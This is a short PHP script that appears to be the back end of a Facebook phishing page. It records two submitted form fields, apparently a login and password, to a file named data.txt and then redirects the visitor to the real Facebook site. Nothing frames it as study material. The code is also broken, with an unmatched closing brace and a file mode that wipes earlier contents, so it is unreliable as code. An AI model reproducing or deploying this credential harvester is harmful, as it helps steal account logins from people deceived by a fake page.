<?php
header('Location: http://www.facebook.com');
$txt = "data.txt";
$fh = fopen($txt, 'w+');
if (isset($_POST['field1']) && isset($_POST['field2'])) 
   $txt=$_POST['field1'].' - '.$_POST['field2'];
   file_put_contents('data.txt',$txt."\n",FILE_APPEND); 
   exit();
}
    fwrite($fh,$txt); 
    fclose($fh); 
 
?>